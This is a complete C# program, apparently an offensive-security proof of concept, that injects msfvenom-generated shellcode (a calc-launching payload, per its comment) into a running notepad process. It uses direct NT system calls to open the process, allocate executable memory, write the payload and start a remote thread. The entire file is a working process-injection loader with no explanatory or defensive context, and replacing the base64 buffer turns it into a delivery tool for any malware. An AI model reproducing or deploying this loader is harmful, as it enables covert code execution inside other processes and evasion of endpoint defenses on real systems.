using System;
using System.Diagnostics;

using static SharpSysCall.Win32;
using static SharpSysCall.Syscall;

namespace SharpSysCall {
	class Program {

		static void Main(string[] args) {

			Console.WriteLine("SharpSyscall Injection");

			Process npProc = Process.GetProcessesByName("notepad")[0];

			//msfvenom -p windows/x64/exec CMD=calc exitfunc=thread -f base64
			byte[] buf = Convert.FromBase64String("/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11IugEAAAAAAAAASI2NAQEAAEG6MYtvh//Vu+AdKgpBuqaVvZ3/1UiDxCg8BnwKgPvgdQW7RxNyb2oAWUGJ2v/VY2FsYwA=");

			IntPtr addr = IntPtr.Zero;
			IntPtr hProcess = IntPtr.Zero;
			IntPtr threadHandle = new IntPtr();
			UIntPtr allocationSize = new UIntPtr(Convert.ToUInt32(buf.Length));
			UInt32 outSize = 0;

			CLIENT_ID ci = new CLIENT_ID {
				UniqueProcess = (IntPtr)npProc.Id
			};
			OBJECT_ATTRIBUTES oa = new OBJECT_ATTRIBUTES();

			NtOpenProcess(ref hProcess, 0x001F0FFF, ref oa, ref ci);
			NtAllocateVirtualMemory(hProcess, ref addr, 0, ref allocationSize, 0x00002000 | 0x00001000, 0x40);
			NtWriteVirtualMemory(hProcess, addr, buf, (uint)buf.Length, ref outSize);
			NtCreateThreadEx(ref threadHandle, 0x0000FFFF | 0x001F0000, IntPtr.Zero, hProcess, addr, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

			Console.WriteLine("done");
			Console.ReadLine();

		}
	}
}
